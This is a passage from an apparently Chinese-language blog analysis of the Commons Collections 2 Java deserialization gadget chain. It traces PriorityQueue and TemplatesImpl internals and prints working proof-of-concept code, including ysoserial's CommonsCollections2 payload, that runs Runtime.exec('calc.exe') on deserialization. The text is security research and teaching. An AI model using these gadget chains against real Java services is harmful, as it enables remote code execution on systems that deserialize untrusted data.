class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        byteArrayInputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后，计算器弹出来了，但报错了</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428232854470-716119011.png" alt="image-20220428232853231"></p><p>根据前面的报错分析，在调用<code>comparator.compare()</code>后，提示 “java.lang.ProcessImpl cannot be cast to java.lang.Comparable”，因为类型不符而报错，和上面那个报错是一样的，但是根据调试发现，程序在反序列化之前就弹出计算器了，那看看是怎么个调用的过程，</p><p>在如下地方打下断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233555440-365558024.png" alt="image-20220428233554728"></p><p>跟进add()方法，发现调用了offer()方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233638389-700739005.png" alt="image-20220428233637971"></p><p>跟进发现在<code>offer()</code>方法里会有一些if判断，这里如果i！&#x3D;0就会调用<code>siftUp()</code>方法，第一次调用add()方法时，这里的i&#x3D;0，即你不会调用siftUp()方法，当第二次调用add()方法时，就会进入，i&#x3D;1，就进入<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428233713262-1085845089.png" alt="image-20220428233712788"></p><p>跟进<code>siftUp()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234016305-1312990915.png" alt="image-20220428234015319"></p><p>这里判断comparator是否为空，如果为不空，就调用<code>siftUpUsingComparator()</code>方法，为空则调用<code>siftUpComparable()</code>方法，跟进<code>siftUpUsingComparator()</code>方法，这里会调用<code>comparator#compare()</code>方法，进而导致了计算器的弹出和报错的产生。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234124506-722393475.png" alt="image-20220428234123995"></p><p>我们返回，跟进<code>siftUpComparable()</code>方法，这里不会导致后续调用链的发生</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428234310569-1479361245.png" alt="image-20220428234310116"></p><p>这里防止报错的关键是让<code>comparator</code>在<code>add()</code>方法调用的时候为空，实例化 <code>PriorityQueue</code> 对象后再通过反射将 <code>comparator</code> 设为 <code>TransformingComparator</code> 对象。</p><p>所以，优化代码后，可构造如下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="comment">// 传入 java.lang.Runtime 类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 反射调用 getMethod() 方法, 并通过 getMethod() 调用 getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 invoke() 方法, 并通过 invoke() 调用上一循环中返回的 Runtime.getRuntime() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="comment">// 反射调用 exec() 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行反序列化的过程中会报同样的错误，但是在报错前就成功执行命令并弹出了计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428235511160-1422424351.png" alt="image-20220428235510084"></p><p>整个 Gadget Chain 的调用过程如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     ChainedTransformer.transform()</span><br><span class="line">         ConstantTransformer.transform()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">       Class.getMethod()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.getRuntime()</span><br><span class="line">      InvokerTransformer.transform()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429000139365-2096780426.png" alt="image-20220429000138216"></p><h3 id="Ysoserial-利用链分析"><a href="#Ysoserial-利用链分析" class="headerlink" title="Ysoserial 利用链分析"></a>Ysoserial 利用链分析</h3><p>对于 Commons Collections 2 这条链，ysoserial 利用的是 <code>TemplatesImpl</code> 类来进行利用的，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123; &quot;org.apache.commons:commons-collections4:4.0&quot; &#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Queue&lt;Object&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections2.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析下<code>TemplatesImpl</code> 是怎么利用的</p><h3 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance()"></a>TemplatesImpl.getTransletInstance()</h3><p>函数中可以看到有一处newInstance()方法的调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001032573-1255924666.png" alt="image-20220429001031837"></p><p>在对类进行 <code>newInstance()</code> 实例化操作时，会首先执行类中的无参数构造方法或 <code>static&#123;&#125;</code> 静态块中的内容，下面为测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">instance</span><span class="params">(Class className)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        className.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        instance(EvalClass.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalClass</span>&#123;</span><br><span class="line"><span class="comment">//    static&#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvalClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001233443-2003682571.png" alt="image-20220429001232664"></p><p>可以看到_class[]为存放这Class类的数组，如果控制 <code>_class[_transletIndex]</code> 的值，使其指向我们精心构造的的类，那么，在执行<code>newInstance()</code> 实例化恶意类时，就会触发恶意代码执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001353700-1606609752.png" alt="image-20220429001353107"></p><h3 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h3><p>要想执行<code>newInstance()</code>方法，需要满足前面的条件，_name不为空</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429001717315-1531884269.png" alt="image-20220429001716751"></p><p>在执行<code>newInstance()</code>方法前会进入 <code>defineTransletClasses()</code> 方法，进入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002213373-1512772555.png" alt="image-20220429002212264"></p><p>在方法中，可以看到在414行代码处，会调用<code>load.defineClass()</code>，学过类加载的知识就知道这里时将 <code>_bytecodes[i]</code> 中的字节码转换成类，并且在下面的if语句中会对转换的类名进行了一个判断，判断父类的类名是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，满足的话就会将索引 <code>i</code> 赋给 <code>_transletIndex</code>，也就是说要想在下面调用newInstance()实例化恶意类，就需要满足我们这个恶意类继承<code>AbstractTranslet</code>。可以知道这里触发的关键在于<code>_bytecodes</code>的赋值，</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429002817204-1446826639.png" alt="image-20220429002816622"></p><p>这里的思路是通过反射获取 <code>_bytecodes</code>，将恶意类的字节码添加到 <code>_bytecodes</code> 中作为一个元素，然后将字节码转换成类并添加到<code>_class[]</code>中，当调用 <code>TemplatesImpl.getTransletInstance()</code> 方法时，执行<code>_class[_transletIndex].newInstance()</code> 进行恶意类的实例化，从而执行恶意代码。</p><p>现在只需要找到调用<code>getTransletInstance()</code> 方法的地方</p><h3 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h3><p>在当前类中搜索<code>getTransletInstance()</code>，发现在<code>newTransformer()</code>方法中会调用<code>getTransletInstance()</code> </p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003327280-1495473657.png" alt="image-20220429003326311"></p><p>可以利用<code>InvokerTransformer</code> 类里的可控反射来调用<code>getTransletInstance()</code> 方法，即构造如下利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">     PriorityQueue.siftDown()</span><br><span class="line">   PriorityQueue.siftDownUsingComparator()</span><br><span class="line">    TransformingComparator.compare()</span><br><span class="line">     InvokerTransformer.transform()</span><br><span class="line">      Method.invoke()</span><br><span class="line">       TemplatesImpl.newTransformer()</span><br><span class="line">        TemplatesImpl.getTransletInstance() -&gt; newInstance()</span><br><span class="line">         Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>构造的poc如下，和ysoserial的poc差不多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparatorTestExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 设置通过 InvokerTransformer.transform() 调用 newTransformer() 方法 */</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;newTransformer&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformers);</span><br><span class="line">        <span 